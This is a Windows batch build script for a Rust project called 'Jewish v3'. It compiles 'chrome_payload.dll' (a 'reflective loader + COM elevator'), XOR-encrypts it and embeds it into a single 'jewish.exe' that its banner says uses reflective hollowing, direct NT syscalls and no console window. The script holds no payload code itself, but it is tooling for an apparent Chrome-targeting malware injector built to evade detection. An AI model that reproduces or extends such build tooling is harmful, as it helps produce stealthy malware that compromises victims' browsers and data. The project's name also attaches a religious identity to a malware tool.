@echo off
setlocal enabledelayedexpansion

set "VERBOSE=0"
set "USE_LOG=0"
set "ARTIFACT_DIR=release"
set "LOG_DIR=build\logs"

:parse_args
if "%~1"=="" goto args_done
if /i "%~1"=="--verbose" set "VERBOSE=1"
if /i "%~1"=="--log" set "USE_LOG=1"
shift
goto parse_args

:args_done
cd /d "%~dp0"

if "%USE_LOG%"=="1" call :init_build_log

echo.
echo ============================================================
echo   Jewish v3 - Release build
echo   chrome_payload.dll -^> XOR embed -^> jewish.exe
if "%VERBOSE%"=="1" echo   Verbose cargo output enabled
if "%USE_LOG%"=="1" echo   Build log: !BUILD_LOG!
echo ============================================================
echo.

call :log_line "[*] Build started"

set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"

call :ensure_rust
if errorlevel 1 goto build_fail

call :ensure_msvc
if errorlevel 1 goto build_fail

call :do_build
if errorlevel 1 goto build_fail

call :copy_artifacts
if errorlevel 1 goto build_fail

call :cleanup_temp
call :log_line "[OK] Build complete"
echo.
echo [OK] Build complete
echo     Output: %ARTIFACT_DIR%\jewish.exe
echo     - chrome_payload.dll built separately, XOR-encrypted by build.rs
echo     - Reflective hollowing + direct NT syscalls (inject crate)
echo     - Single exe, no console window
if "%USE_LOG%"=="1" echo     Build log: !BUILD_LOG!
echo.
pause
exit /b 0

:init_build_log
if not exist "%LOG_DIR%" mkdir "%LOG_DIR%"
for /f "tokens=1-4 delims=/:. " %%a in ("%date% %time%") do (
    set "BUILD_LOG=%LOG_DIR%\build_%%c%%a%%b_%%d.log"
)
set "BUILD_LOG=!BUILD_LOG: =0!"
echo Build log started at %date% %time%> "!BUILD_LOG!"
exit /b 0

:log_line
if "%USE_LOG%"=="1" echo %~1>> "!BUILD_LOG!"
echo %~1
exit /b 0

:run_cargo
set "CARGO_CMD=cargo build --release %~1"
if "%VERBOSE%"=="1" set "CARGO_CMD=!CARGO_CMD! -v"
call :log_line "[*] Running: !CARGO_CMD!"
if "%USE_LOG%"=="1" (
    !CARGO_CMD!>> "!BUILD_LOG!" 2>&1
    set "CARGO_EXIT=!errorlevel!"
) else (
    !CARGO_CMD!
    set "CARGO_EXIT=!errorlevel!"
)
exit /b !CARGO_EXIT!

:ensure_rust
where rustc >nul 2>&1
if not errorlevel 1 (
    call :log_line "[OK] Rust found"
    if "%VERBOSE%"=="1" rustup show active-toolchain 2>&1
    if "%USE_LOG%"=="1" rustup show active-toolchain>> "!BUILD_LOG!" 2>&1
    exit /b 0
)
call :log_line "[*] Downloading Rust..."
curl -fsSL -o "%TEMP%\rustup-init.exe" https://win.rustup.rs/x86_64
if errorlevel 1 (
    call :log_line "[X] Failed to download rustup-init.exe"
    exit /b 1
)
"%TEMP%\rustup-init.exe" -y --default-toolchain stable
set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"
where rustc >nul 2>&1 || (
    call :log_line "[X] Rust install failed"
    exit /b 1
)
exit /b 0

:ensure_msvc
call :find_vcvars
if defined VCVARS (
    if exist "!VCVARS!" (
        call "!VCVARS!" >nul 2>&1
        where cl >nul 2>&1
        if not errorlevel 1 (
            call :log_line "[OK] MSVC ready"
            call :log_line "     !VCVARS!"
            exit /b 0
        )
        call :log_line "[!] vcvars found but cl.exe missing"
        call :log_line "     Install workload: Desktop development with C++"
    )
)
where link >nul 2>&1
if not errorlevel 1 (
    call :log_line "[OK] MSVC ready - link already in PATH"
    exit /b 0
)
call :log_line "[X] Visual C++ Build Tools not detected"
echo.
echo     Open "Visual Studio Installer" and verify:
echo       - Visual Studio Build Tools 2022
echo       - Workload: "Desktop development with C++"
echo.
call :probe_msvc
echo     https://visualstudio.microsoft.com/visual-cpp-build-tools/
pause
exit /b 1

:find_vcvars
set "VCVARS="
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if exist "%VSWHERE%" (
    for /f "usebackq delims=" %%I in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2^>nul`) do (
        if exist "%%I\VC\Auxiliary\Build\vcvars64.bat" (
            set "VCVARS=%%I\VC\Auxiliary\Build\vcvars64.bat"
        )
    )
)
if defined VCVARS exit /b 0
for %%Y in (2026 2025 2022) do (
    for %%E in (BuildTools Community Professional Enterprise) do (
        set "_C=C:\Program Files\Microsoft Visual Studio\%%Y\%%E\VC\Auxiliary\Build\vcvars64.bat"
        if exist "!_C!" set "VCVARS=!_C!"
    )
)
exit /b 0

:probe_msvc
if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" (
    echo     Installed VS products:
    "%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" -all -products * -property displayName,installationPath 2>nul
) else (
    echo     vswhere.exe not found - VS Installer may be missing
)
for %%Y in (2026 2025 2022) do (
    for %%E in (BuildTools Community Professional Enterprise) do (
        set "_C=C:\Program Files\Microsoft Visual Studio\%%Y\%%E\VC\Auxiliary\Build\vcvars64.bat"
        if exist "!_C!" echo     Found: !_C!
    )
)
exit /b 0

:do_build
echo.
call :log_line "[*] Step 1/2: chrome-payload (reflective loader + COM elevator)..."
call :run_cargo "-p chrome-payload"
if errorlevel 1 exit /b 1
if not exist "target\release\chrome_payload.dll" (
    call :log_line "[X] target\release\chrome_payload.dll missing after payload build"
    call :log_line "     Expected crate output name: chrome_payload.dll"
    exit /b 1
)
for %%F in ("target\release\chrome_payload.dll") do call :log_line "     payload DLL: %%~zF bytes"

echo.
call :log_line "[*] Step 2/2: jewish.exe (build.rs embeds XOR-encrypted payload)..."
call :log_line "     inject crate is built automatically as a dependency."
call :log_line "     Final link step may pause at 237/238 for 30-90s - normal."
call :run_cargo "-p jewish"
if errorlevel 1 exit /b 1
if not exist "target\release\jewish.exe" (
    call :log_line "[X] target\release\jewish.exe missing after main build"
    exit /b 1
)
exit /b 0

:copy_artifacts
if not exist "%ARTIFACT_DIR%" mkdir "%ARTIFACT_DIR%"
copy /Y "target\release\jewish.exe" "%ARTIFACT_DIR%\jewish.exe" >nul
if errorlevel 1 (
    call :log_line "[X] Failed to copy jewish.exe to %ARTIFACT_DIR%\"
    exit /b 1
)
for %%F in ("%ARTIFACT_DIR%\jewish.exe") do call :log_line "     %ARTIFACT_DIR%\jewish.exe: %%~zF bytes"
exit /b 0

:cleanup_temp
if exist "%TEMP%\rustup-init.exe" del /q "%TEMP%\rustup-init.exe" >nul 2>&1
exit /b 0

:build_fail
echo.
echo [X] Build failed
echo.
echo     Manual build order:
echo       cargo build --release -p chrome-payload
echo       cargo build --release -p jewish
echo.
echo     build.rs reads target\release\chrome_payload.dll and writes payload.enc
echo     into OUT_DIR before linking jewish.exe.
if "%USE_LOG%"=="1" (
    echo.
    echo     Full build log:
    echo       !BUILD_LOG!
    echo.
    echo     Last lines from log:
    powershell -NoProfile -Command "Get-Content -Path '!BUILD_LOG!' -Tail 25" 2>nul
)
echo.
pause
exit /b 1
